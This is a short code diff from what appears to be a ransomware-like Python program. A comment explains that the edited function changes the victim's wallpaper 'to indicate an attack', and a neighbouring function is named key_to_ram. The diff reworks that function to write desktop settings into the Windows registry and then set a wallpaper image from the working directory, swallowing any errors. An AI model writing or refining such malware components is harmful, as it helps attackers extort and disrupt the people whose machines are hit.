@@ -255,14 +255,18 @@ def key_to_ram(key):
 
 # Change the wallpaper of the user to indicate an attack
 def change_windows_wallpaper():
-    wallpaper_path = f"{os.getcwd()}\\wallpaperX324HF.png"
-    wallpaper_style = 6
-
-    try:
-        SPI_SETDESKWALLPAPER = 20
-        image = ctypes.c_wchar_p(wallpaper_path)
-
-        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image, wallpaper_style)
+    wallpaper_path = os.path.join(os.getcwd(), 'wallpaperX324HF.png')
+    SPI_SETDESKWALLPAPER = 0x0014
+    
+    try:    
+        # Update registry to reflect changes        
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Control Panel\Desktop', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "10") 
+        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
+        winreg.CloseKey(key)
+        
+        # Apply changes
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)
     except:
         return
 
